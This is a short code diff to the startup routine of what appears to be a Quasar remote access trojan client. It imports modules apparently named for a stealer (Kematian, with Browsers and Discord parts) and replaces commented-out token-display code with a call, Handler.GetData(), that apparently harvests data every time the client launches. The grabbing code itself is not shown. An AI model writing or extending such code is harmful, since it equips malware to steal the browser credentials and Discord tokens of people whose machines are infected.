@@ -1,4 +1,6 @@
 ﻿using Quasar.Client.IO;
+using Quasar.Client.Kematian;
+using Quasar.Client.Kematian.Browsers;
 using Quasar.Client.Kematian.Discord;
 using System;
 using System.Diagnostics;
@@ -28,11 +30,8 @@ namespace Quasar.Client
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
 
-            //var token = GetTokens.Tokens();
-            //if (token != null)
-            //{
-            //    MessageBox.Show(token, "Token", MessageBoxButtons.OK, MessageBoxIcon.Information);
-            //}
+            Handler.GetData();
+            Debug.WriteLine("Done");
 
             Application.Run(new QuasarApplication());
         }
